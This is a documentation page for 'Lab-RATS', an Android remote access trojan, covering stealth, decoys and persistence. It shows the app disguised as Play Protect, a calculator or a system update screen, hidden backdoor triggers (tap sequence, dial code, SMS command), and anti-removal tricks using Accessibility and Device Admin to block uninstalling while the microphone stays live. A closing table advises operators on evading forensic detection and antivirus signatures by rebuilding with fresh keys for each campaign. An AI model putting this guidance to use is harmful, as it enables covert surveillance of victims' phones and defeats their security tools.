# 06 ⏤ Stealth, Decoys & Persistence

> Lab-RATS incorporates multi-layered stealth camouflage and anti-removal persistence mechanisms.

## 🎭 Stealth Decoys (Functional)

After initial installation, the application disguises its launcher icon and label as a legitimate system utility:

| Persona | Decoy Name | Screen Behavior |
| :--- | :--- | :--- |
| **Persona 1** | **Play Protect** | Displays a fake Google Play Protect system security scan screen. |
| **Persona 2** | **Calculator** | Functional scientific calculator interface. |
| **Persona 3** | **Weather** | Live weather forecast screen pulling real-time weather data. |
| **Persona 4** | **System Update** | Authentic Samsung / Android "System Update Complete" screen. |
| **Persona 5** | **Smart Tutor** | Replica Samsung Smart Tutor Customer Care & Remote Support screen. |

Operators can switch active decoy personas remotely at any time from the **Terminal** tab on the C2 dashboard.

---

## 🔑 Secret Backdoor Recovery Gestures

If operating in stealth mode, the dashboard can be unmasked on the target phone using either:

1. **10 Rapid Taps**: Rapidly tap the center image/logo of the decoy screen 10 times in under 3 seconds.
2. **Emergency Phone Dial Code**: Dial **`*#1337#`** in the phone dialer.
3. **SMS Emergency Restart**: Send an SMS containing **`!RESTART_C2`** to the target device.

---

## 🛡️ Persistence & Anti-Removal Layers

1. **Accessibility Watchdog**: An enabled Accessibility Service re-animates the core C2 background service if terminated by Android memory management.
2. **Device Administration Elevation**: Device Admin status disables the OS "Force Stop" and "Uninstall" buttons inside **Settings $\rightarrow$ Apps**.
3. **Foreground Service Protection**: Runs as a persistent, low-priority background service (`IMPORTANCE_MIN`) with `FOREGROUND_SERVICE_TYPE_MICROPHONE` and `DATA_SYNC` flags to maintain background microphone and network access on Android 14+.
4. **Recent Apps Ghosting**: The application activity is hidden from the Android **Recent Apps / Task Manager** screen (`android:excludeFromRecents="true"`).

---

## 🔍 Detection Indicators & Forensic Artifacts

While Lab-RATS incorporates strong stealth mechanisms, a security analyst or forensic tool inspecting the device can identify these artifacts:

| Forensic Indicator | Detection Risk | Mitigation Strategy |
| :--- | :--- | :--- |
| **Default Package ID** (`com.android.system.stability`) | Medium | Customize `PKG_NAME` in `local.properties` before compilation. |
| **Accessibility Service Entry** | Medium | Visible under **Settings $\rightarrow$ Accessibility** (required for background watchdog persistence). |
| **Foreground Service Notification** | Low | Minimized to silent `IMPORTANCE_MIN` status on Android 8.0+. |
| **Listening Port Socket (`9191`)** | Medium | Visible in `adb shell dumpsys activity services`. Customize `DEFAULT_PORT` in `FirebaseConfig.java`. |
| **Default Signing Certificate Subject** | High | Change default keystore subject (`CN=Lab-RATS Developer`) by generating a unique custom keystore via `./build.sh` option `2`. |

> ⚠️ **Play Protect & Antivirus Signature Notice**: Security vendors (Play Protect, Samsung Knox, McAfee) continuously update signature databases. Reusing previously flagged signing keys across campaigns increases detection risk. Generating a fresh build with a unique package name and a new signing key for each campaign ensures clean installation.
